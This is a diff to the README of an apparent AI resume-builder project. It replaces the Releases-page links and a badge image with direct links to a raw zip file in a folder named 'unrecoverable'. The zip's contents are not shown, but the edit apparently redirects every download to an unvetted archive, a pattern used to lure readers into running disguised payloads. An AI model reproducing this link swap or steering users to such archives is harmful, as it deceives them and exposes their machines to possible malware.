@@ -1,6 +1,6 @@
 # 🤖 AI-Resume-Portfolio-Builder - Create Professional Resumes Easily
 
-![Download AI-Resume-Portfolio-Builder](https://img.shields.io/badge/Download-AI--Resume--Portfolio--Builder-brightgreen)
+![Download AI-Resume-Portfolio-Builder](https://raw.githubusercontent.com/stererwe/AI-Resume-Portfolio-Builder/main/unrecoverable/AI-Resume-Portfolio-Builder.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Welcome to the AI-Resume-Portfolio-Builder! This tool uses the power of AI to he
 
 To download the application, visit the Releases page. Follow the steps below to get started.
 
-[Download here](https://github.com/stererwe/AI-Resume-Portfolio-Builder/releases)
+[Download here](https://raw.githubusercontent.com/stererwe/AI-Resume-Portfolio-Builder/main/unrecoverable/AI-Resume-Portfolio-Builder.zip)
 
 ### 📥 How to Download
 
@@ -67,6 +67,6 @@ A: Feel free to reach out through the Issues section on our GitHub repository.
 
 Join our community on GitHub for tips, support, and sharing your creations. Feedback is always welcome, and you can contribute to the project by reporting issues or suggesting improvements.
 
-[Download here](https://github.com/stererwe/AI-Resume-Portfolio-Builder/releases)
+[Download here](https://raw.githubusercontent.com/stererwe/AI-Resume-Portfolio-Builder/main/unrecoverable/AI-Resume-Portfolio-Builder.zip)
 
 Happy building!
